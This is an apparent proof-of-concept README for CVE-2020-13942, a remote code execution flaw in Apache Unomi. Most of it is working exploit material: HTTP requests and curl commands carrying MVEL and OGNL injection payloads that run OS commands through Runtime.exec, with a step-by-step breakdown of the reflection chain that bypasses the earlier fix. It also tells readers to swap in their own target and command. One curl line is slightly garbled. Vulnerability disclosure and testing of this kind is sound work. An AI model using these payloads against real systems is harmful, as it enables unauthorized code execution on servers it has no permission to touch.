# CVE-2020-13942
## CVE-2020-13942 POC by Eugene Rojavski

Original blog post about the vulnerability:
https://www.checkmarx.com/blog/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/

There are two RCE vectors: through MVEL injection and through OGNL injection. Both vectors target different code though the payloads look relatively similar.
The previous CVE fix https://nvd.nist.gov/vuln/detail/CVE-2020-11975 tried to limit execution of OGNL expressions, but completely missed MVEL. The CVE-2020-13942 bypasses the fix made in 1.5.1.

Send the following HTTP requests using BurpSuite or curl to context.js\json exposed by Unomi server and get RCE. Change Host and Content-length according to your target URL and OS command.
Both POCs can get `HTTP/1.1 400 Header Folding` in response, which means `\r\n` are messed up in the payload, try copy-pasting it once more.

### 1) MVEL POC

#### HTTP request

```
POST /context.json HTTP/1.1
Host: localhost:8181
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Content-Length: 486

{
    "filters": [
        {
            "id": "boom",
            "filters": [
                {
                    "condition": {
                         "parameterValues": {
                            "": "script::Runtime r = Runtime.getRuntime(); r.exec(\"gnome-calculator\");"
                        },
                        "type": "profilePropertyCondition"
                    }
                }
            ]
        }
    ],
    "sessionId": "boom"
}
```

#### Curl
```
curl -X POST http://localhost:8181/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec(\"gnome-calculator\");"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}'
```

### 2) OGNL POC

OGNL POC bypassed the ClassLoader restriction introduced by 1.5.1 version. Using Java reflections API it's possible to create an object without triggering ClassLoader.loadClass method that restricts the evaluated OGNL expressions.

The payload OGNL expression breakdown:
1.	The first expression `#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")` creates a java.lang.Runtime Class object, where #this is the reference to the context object. 
2.	The second expression `#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]` gets the methods list of the Runtime class through reflections and chooses getRuntime method out of the list. The `{^ #this.name.equals(\"getRuntime\")}` part of the expression looks for a Method with the name getRuntime and returns a list of the Methods that match the condition; the first and the only Method of this list is getRuntime. 
3.	The third expression `#runtimeobject = #runtimemethod.invoke(null,null)` calls the getRuntime() method and obtains the Runtime object. 
4.	The fourth expression `(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0])` gets the methods of the Runtime class and retrieves Runtime.exec() with a single String argument out of the method list. 
5.	The final expression `#execmethod.invoke(#runtimeobject,\"gnome-calculator\")` calls Runtime.exec() with the specified argument.


#### HTTP request
```
POST /context.json HTTP/1.1
Host: localhost:8181
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Content-Length: 1068

{
  "personalizations":[
    {
      "id":"gender-test",
      "strategy":"matching-first",
      "strategyOptions":{
        "fallback":"var2"
      },
      "contents":[
        {
          "filters":[
            {
              "condition":{
                "parameterValues":{
                  "propertyName":"(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\" gnome-calculator\"))",
                  "comparisonOperator":"equals",
                  "propertyValue":"male"
                },
                "type":"profilePropertyCondition"
              }
            }
          ]
        }
      ]
    }
  ],
  "sessionId":"boom"
} 
```

#### Curl

```
curl -XPOST http://localhost:8181/context.jsonder 'Content-Type: application/json' --data '{"personalizations":[{"id":"gender-test","strategy":"matching-first","strategyOptions":{"fallback":"var2"},"contents":[{"filters":[{"condition":{"parameterValues":{"propertyName": "(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\")).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}.{? #this.getParameters()[0].getType().getName().equals(\"java.lang.String\")}.{? #this.getParameters().length < 2}[0]).(#execmethod.invoke(#rtobj,\"gnome-calculator\"))","comparisonOperator":"equals","propertyValue":"male"},"type":"profilePropertyCondition"}}]}]}],"sessionId":"boom"}'
```



### Disclaimer
All the information provided on this page is for educational purposes only. The information on this website should only be used to enhance the security for your computer systems and not for causing malicious or damaging attacks.

You should not misuse this information to gain unauthorized access into computer systems. Also be aware, performing hack attempts on computers that you do not own, without written permission from owners, is illegal.

I will not be responsible for any direct or indirect damage caused due to the usage of the information provided on this website.
